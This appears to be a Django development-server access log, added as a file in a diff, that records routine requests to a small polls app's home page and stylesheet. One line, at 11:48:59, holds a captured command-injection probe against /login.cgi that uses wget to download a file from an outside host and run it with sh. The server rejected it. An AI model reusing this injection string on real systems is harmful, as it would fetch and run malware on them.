+[22/Jul/2018 11:34:32] "GET /polls/home/ HTTP/1.1" 200 2153
+[22/Jul/2018 11:34:32] "GET /static/polls/style_home.css HTTP/1.1" 200 1269
+[22/Jul/2018 11:39:16] "GET /polls/home/ HTTP/1.1" 200 2206
+[22/Jul/2018 11:39:16] "GET /static/polls/style_home.css HTTP/1.1" 200 1317
+[22/Jul/2018 11:39:54] "GET /polls/home/ HTTP/1.1" 200 2235
+[22/Jul/2018 11:39:55] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 11:41:09] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:41:10] "GET /static/polls/style_home.css HTTP/1.1" 200 1388
+[22/Jul/2018 11:42:06] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:42:06] "GET /static/polls/style_home.css HTTP/1.1" 200 1414
+[22/Jul/2018 11:42:08] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:42:08] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 11:42:08] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:42:08] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 11:42:09] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:42:09] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 11:42:09] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:42:09] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 11:42:09] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:42:09] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 11:42:10] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:42:10] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 11:42:37] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:42:37] "GET /static/polls/style_home.css HTTP/1.1" 200 1437
+[22/Jul/2018 11:42:48] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:42:48] "GET /static/polls/style_home.css HTTP/1.1" 200 1437
+[22/Jul/2018 11:44:01] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:44:01] "GET /static/polls/style_home.css HTTP/1.1" 200 1444
+[22/Jul/2018 11:44:28] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:44:29] "GET /static/polls/style_home.css HTTP/1.1" 200 1472
+[22/Jul/2018 11:47:09] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:47:09] "GET /static/polls/style_home.css HTTP/1.1" 200 1472
+[22/Jul/2018 11:48:49] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:48:49] "GET /static/polls/style_home.css HTTP/1.1" 200 1504
+Invalid HTTP_HOST header: 'localhost.localdomain'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[22/Jul/2018 11:48:59] "GET /login.cgi?cli=aa%20aa%27;wget%20http://g.mariokartayy.com/x%20-O%20-%3E%20/tmp/x;sh%20/tmp/x%27$ HTTP/1.1" 400 60274
+[22/Jul/2018 11:49:05] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:49:05] "GET /static/polls/style_home.css HTTP/1.1" 200 1504
+[22/Jul/2018 11:49:21] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:49:21] "GET /static/polls/style_home.css HTTP/1.1" 200 1504
+[22/Jul/2018 11:49:47] "GET /polls/home/ HTTP/1.1" 200 2250
+[22/Jul/2018 11:49:47] "GET /static/polls/style_home.css HTTP/1.1" 200 1548
+[22/Jul/2018 11:52:46] "GET /polls/home/ HTTP/1.1" 200 2354
+[22/Jul/2018 11:52:46] "GET /static/polls/style_home.css HTTP/1.1" 200 1548
+[22/Jul/2018 11:53:28] "GET /polls/home/ HTTP/1.1" 200 2323
+[22/Jul/2018 11:53:28] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 11:53:29] "GET /polls/home/ HTTP/1.1" 200 2323
+[22/Jul/2018 11:53:30] "GET /polls/home/ HTTP/1.1" 200 2323
+[22/Jul/2018 11:53:30] "GET /polls/home/ HTTP/1.1" 200 2323
+[22/Jul/2018 11:53:59] "GET /polls/home/ HTTP/1.1" 200 2323
+[22/Jul/2018 11:53:59] "GET /static/polls/style_home.css HTTP/1.1" 200 1548
+[22/Jul/2018 11:56:11] "GET /polls/home/ HTTP/1.1" 200 2323
+[22/Jul/2018 11:56:11] "GET /static/polls/style_home.css HTTP/1.1" 200 1569
+[22/Jul/2018 12:00:13] "GET /polls/home/ HTTP/1.1" 200 2323
+[22/Jul/2018 12:00:13] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:00:14] "GET /polls/home/ HTTP/1.1" 200 2323
+[22/Jul/2018 12:00:15] "GET /polls/home/ HTTP/1.1" 200 2323
+[22/Jul/2018 12:00:43] "GET /polls/home/ HTTP/1.1" 200 2361
+[22/Jul/2018 12:00:43] "GET /static/polls/style_home.css HTTP/1.1" 200 1541
+[22/Jul/2018 12:01:26] "GET /polls/home/ HTTP/1.1" 200 2361
+[22/Jul/2018 12:01:27] "GET /static/polls/style_home.css HTTP/1.1" 200 1541
+[22/Jul/2018 12:02:33] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:02:33] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:02:49] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:02:49] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:02:50] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:02:50] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:02:50] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:02:51] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:02:51] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:02:51] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:02:52] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:02:52] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:02:53] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:03:16] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:03:16] "GET /static/polls/style_home.css HTTP/1.1" 200 1541
+Invalid HTTP_HOST header: 'localhost.localdomain'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[22/Jul/2018 12:05:05] "GET / HTTP/1.0" 400 58445
+[22/Jul/2018 12:05:54] "GET /polls/home/ HTTP/1.1" 200 2404
+[22/Jul/2018 12:05:54] "GET /static/polls/style_home.css HTTP/1.1" 200 1625
+[22/Jul/2018 12:05:55] "GET /polls/home/ HTTP/1.1" 200 2404
+[22/Jul/2018 12:05:55] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:07:06] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:07:06] "GET /static/polls/style_home.css HTTP/1.1" 200 1609
+[22/Jul/2018 12:07:33] "GET /polls/home/ HTTP/1.1" 200 2388
+[22/Jul/2018 12:07:33] "GET /static/polls/style_home.css HTTP/1.1" 200 1609
+[22/Jul/2018 12:08:36] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:08:36] "GET /static/polls/style_home.css HTTP/1.1" 200 1609
+[22/Jul/2018 12:08:37] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:08:37] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:08:58] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:08:58] "GET /static/polls/style_home.css HTTP/1.1" 200 1609
+[22/Jul/2018 12:08:58] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:08:58] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:08:59] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:08:59] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:10:05] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:10:05] "GET /static/polls/style_home.css HTTP/1.1" 200 1562
+[22/Jul/2018 12:10:19] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:10:19] "GET /static/polls/style_home.css HTTP/1.1" 200 1609
+[22/Jul/2018 12:10:48] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:10:48] "GET /static/polls/style_home.css HTTP/1.1" 200 1590
+[22/Jul/2018 12:10:48] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:10:49] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:11:07] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:11:07] "GET /static/polls/style_home.css HTTP/1.1" 200 1590
+[22/Jul/2018 12:11:13] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:11:14] "GET /static/polls/style_home.css HTTP/1.1" 200 1590
+[22/Jul/2018 12:11:38] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:11:38] "GET /static/polls/style_home.css HTTP/1.1" 200 1562
+[22/Jul/2018 12:11:39] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:11:39] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:11:51] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:11:51] "GET /static/polls/style_home.css HTTP/1.1" 200 1496
+[22/Jul/2018 12:12:08] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:12:09] "GET /static/polls/style_home.css HTTP/1.1" 200 1562
+[22/Jul/2018 12:12:46] "GET /polls/home/ HTTP/1.1" 200 2382
+[22/Jul/2018 12:12:46] "GET /static/polls/style_home.css HTTP/1.1" 200 1562
+[22/Jul/2018 12:12:47] "GET /polls/home/ HTTP/1.1" 200 2382
+[22/Jul/2018 12:12:47] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:12:48] "GET /polls/home/ HTTP/1.1" 200 2382
+[22/Jul/2018 12:12:48] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:12:48] "GET /polls/home/ HTTP/1.1" 200 2382
+[22/Jul/2018 12:12:48] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:14:10] "GET /polls/home/ HTTP/1.1" 200 2382
+[22/Jul/2018 12:14:10] "GET /static/polls/style_home.css HTTP/1.1" 200 1608
+[22/Jul/2018 12:14:12] "GET /polls/home/ HTTP/1.1" 200 2382
+[22/Jul/2018 12:14:13] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:14:27] "GET /polls/home/ HTTP/1.1" 200 2382
+[22/Jul/2018 12:14:27] "GET /static/polls/style_home.css HTTP/1.1" 200 1609
+[22/Jul/2018 12:15:18] "GET /polls/home/ HTTP/1.1" 200 2382
+[22/Jul/2018 12:15:18] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:15:19] "GET /polls/home/ HTTP/1.1" 200 2382
+[22/Jul/2018 12:17:40] "GET /polls/home/ HTTP/1.1" 200 2426
+[22/Jul/2018 12:17:41] "GET /static/polls/style_home.css HTTP/1.1" 200 1646
+[22/Jul/2018 12:17:41] "GET /polls/home/ HTTP/1.1" 200 2426
+[22/Jul/2018 12:17:41] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:17:42] "GET /polls/home/ HTTP/1.1" 200 2426
+[22/Jul/2018 12:17:42] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:17:42] "GET /polls/home/ HTTP/1.1" 200 2426
+[22/Jul/2018 12:17:42] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:17:42] "GET /polls/home/ HTTP/1.1" 200 2426
+[22/Jul/2018 12:17:43] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:18:06] "GET /polls/home/ HTTP/1.1" 200 2408
+[22/Jul/2018 12:18:06] "GET /static/polls/style_home.css HTTP/1.1" 200 1609
+[22/Jul/2018 12:18:06] "GET /polls/home/ HTTP/1.1" 200 2408
+[22/Jul/2018 12:18:06] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:19:12] "GET /polls/home/ HTTP/1.1" 200 2421
+[22/Jul/2018 12:19:12] "GET /static/polls/style_home.css HTTP/1.1" 200 1645
+[22/Jul/2018 12:19:13] "GET /polls/home/ HTTP/1.1" 200 2421
+[22/Jul/2018 12:19:13] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:19:14] "GET /polls/home/ HTTP/1.1" 200 2421
+[22/Jul/2018 12:19:14] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:19:14] "GET /polls/home/ HTTP/1.1" 200 2421
+[22/Jul/2018 12:19:14] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:19:15] "GET /polls/home/ HTTP/1.1" 200 2421
+[22/Jul/2018 12:19:15] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:19:42] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:19:42] "GET /static/polls/style_home.css HTTP/1.1" 200 1610
+[22/Jul/2018 12:19:43] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:19:43] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:19:43] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:19:44] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:19:44] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:19:44] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:19:44] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:19:45] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:19:45] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:19:46] "GET /polls/home/ HTTP/1.1" 200 2385
+[22/Jul/2018 12:19:46] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:19:58] "GET /polls/home/ HTTP/1.1" 200 2382
+[22/Jul/2018 12:19:58] "GET /static/polls/style_home.css HTTP/1.1" 200 1610
+[22/Jul/2018 12:19:59] "GET /polls/home/ HTTP/1.1" 200 2382
+[22/Jul/2018 12:19:59] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:21:11] "GET /polls/home/?searchtext= HTTP/1.1" 200 2382
+[22/Jul/2018 12:21:11] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:21:13] "GET /polls/home/?searchtext= HTTP/1.1" 200 2382
+[22/Jul/2018 12:21:14] "GET /polls/home/?searchtext= HTTP/1.1" 200 2382
+[22/Jul/2018 12:21:14] "GET /polls/home/?searchtext= HTTP/1.1" 200 2382
+[22/Jul/2018 12:21:15] "GET /polls/home/?searchtext= HTTP/1.1" 200 2382
+[22/Jul/2018 12:22:27] "GET /polls/home/?searchtext= HTTP/1.1" 200 2382
+[22/Jul/2018 12:22:27] "GET /static/polls/style_home.css HTTP/1.1" 200 1670
+[22/Jul/2018 12:28:29] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:28:29] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:28:29] "GET /static/polls/style_home.css HTTP/1.1" 200 1685
+[22/Jul/2018 12:28:30] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:28:30] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:28:31] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:28:31] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:28:45] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:28:45] "GET /static/polls/style_home.css HTTP/1.1" 200 1669
+[22/Jul/2018 12:29:04] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:29:04] "GET /static/polls/style_home.css HTTP/1.1" 200 1685
+[22/Jul/2018 12:29:40] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:29:41] "GET /static/polls/style_home.css HTTP/1.1" 200 1684
+[22/Jul/2018 12:29:48] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:29:48] "GET /static/polls/style_home.css HTTP/1.1" 200 1684
+[22/Jul/2018 12:30:03] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:04] "GET /static/polls/style_home.css HTTP/1.1" 200 1668
+[22/Jul/2018 12:30:05] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:05] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:30:05] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:06] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:30:06] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:06] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:30:06] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:07] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:30:07] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:07] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:08] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:30:08] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:08] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:09] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:30:09] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:09] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:10] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:30:10] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:10] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:11] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:11] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:30:11] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:12] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:30:12] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:30:16] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 12:31:29] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:31:29] "GET /static/polls/style_home.css HTTP/1.1" 200 1716
+[22/Jul/2018 12:31:29] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 12:31:54] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:31:54] "GET /static/polls/style_home.css HTTP/1.1" 200 1715
+[22/Jul/2018 12:31:54] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 12:32:14] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:32:14] "GET /static/polls/style_home.css HTTP/1.1" 200 1715
+[22/Jul/2018 12:32:24] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:32:24] "GET /static/polls/style_home.css HTTP/1.1" 200 1715
+[22/Jul/2018 12:32:35] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:32:35] "GET /static/polls/style_home.css HTTP/1.1" 200 1715
+[22/Jul/2018 12:36:58] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 12:36:58] "GET /static/polls/style_home.css HTTP/1.1" 200 1670
+[22/Jul/2018 13:37:09] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 13:37:09] "GET /static/polls/style_home.css HTTP/1.1" 200 1693
+[22/Jul/2018 13:37:10] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 13:37:11] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 13:37:11] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 13:37:12] "GET /static/polls/style_home.css HTTP/1.1" 200 1693
+[22/Jul/2018 13:37:33] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 13:37:33] "GET /static/polls/style_home.css HTTP/1.1" 200 1721
+[22/Jul/2018 13:37:35] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 13:37:36] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 13:37:36] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 13:37:37] "GET /static/polls/style_home.css HTTP/1.1" 200 1721
+[22/Jul/2018 13:37:37] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 13:37:37] "GET /static/polls/style_home.css HTTP/1.1" 200 1721
+[22/Jul/2018 13:37:40] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 13:37:40] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 13:37:43] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 13:37:43] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 13:37:45] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 13:37:45] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 13:38:26] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 13:38:27] "GET /static/polls/style_home.css HTTP/1.1" 200 1669
+[22/Jul/2018 13:40:06] "GET /polls/home/?searchtext= HTTP/1.1" 200 2372
+[22/Jul/2018 13:40:07] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 13:40:15] "GET /polls/home/?searchtext= HTTP/1.1" 200 2401
+[22/Jul/2018 13:41:56] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 13:43:48] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:43:48] "GET /static/polls/style_home.css HTTP/1.1" 200 1669
+[22/Jul/2018 13:43:48] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 13:44:52] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:44:52] "GET /static/polls/style_home.css HTTP/1.1" 200 1023
+[22/Jul/2018 13:44:52] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 13:44:54] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:44:55] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:44:55] "GET /static/polls/style_home.css HTTP/1.1" 200 1023
+[22/Jul/2018 13:44:55] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+Not Found: /
+[22/Jul/2018 13:46:57] "GET / HTTP/1.1" 404 2030
+[22/Jul/2018 13:49:18] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:49:18] "GET /static/polls/style_home.css HTTP/1.1" 200 1051
+[22/Jul/2018 13:49:19] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 13:50:00] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:50:00] "GET /static/polls/style_home.css HTTP/1.1" 200 1051
+[22/Jul/2018 13:50:00] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 13:51:52] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:51:52] "GET /static/polls/style_home.css HTTP/1.1" 200 951
+[22/Jul/2018 13:51:52] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 13:52:01] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:52:01] "GET /static/polls/style_home.css HTTP/1.1" 200 972
+[22/Jul/2018 13:52:01] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 13:52:35] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:52:35] "GET /static/polls/style_home.css HTTP/1.1" 200 993
+[22/Jul/2018 13:52:35] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 13:52:55] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:52:55] "GET /static/polls/style_home.css HTTP/1.1" 200 1013
+[22/Jul/2018 13:52:55] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 13:52:57] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:52:57] "GET /static/polls/style_home.css HTTP/1.1" 200 1013
+[22/Jul/2018 13:52:57] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 13:57:06] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:57:06] "GET /static/polls/style_home.css HTTP/1.1" 200 1036
+[22/Jul/2018 13:57:07] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 13:57:10] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:57:10] "GET /static/polls/style_home.css HTTP/1.1" 200 1036
+[22/Jul/2018 13:57:10] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 13:57:37] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:57:37] "GET /static/polls/style_home.css HTTP/1.1" 200 995
+[22/Jul/2018 13:57:37] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 13:59:34] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 13:59:34] "GET /static/polls/style_home.css HTTP/1.1" 200 1011
+[22/Jul/2018 13:59:34] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+Not Found: /
+[22/Jul/2018 14:05:32] "GET / HTTP/1.1" 404 2027
+[22/Jul/2018 14:05:36] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 14:05:36] "GET /static/polls/style_home.css HTTP/1.1" 200 997
+[22/Jul/2018 14:05:36] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:06:35] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 14:06:36] "GET /static/polls/style_home.css HTTP/1.1" 200 997
+[22/Jul/2018 14:06:36] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:07:05] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 14:07:05] "GET /static/polls/style_home.css HTTP/1.1" 200 972
+[22/Jul/2018 14:07:05] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:07:21] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 14:07:22] "GET /static/polls/style_home.css HTTP/1.1" 200 876
+[22/Jul/2018 14:07:22] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:07:36] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 14:07:36] "GET /static/polls/style_home.css HTTP/1.1" 200 972
+[22/Jul/2018 14:07:36] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:09:09] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 14:09:09] "GET /static/polls/style_home.css HTTP/1.1" 200 993
+[22/Jul/2018 14:09:09] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+Not Found: /
+[22/Jul/2018 14:09:56] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[22/Jul/2018 14:10:07] "GET / HTTP/1.1" 404 2027
+[22/Jul/2018 14:10:22] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 14:10:22] "GET /static/polls/style_home.css HTTP/1.1" 200 968
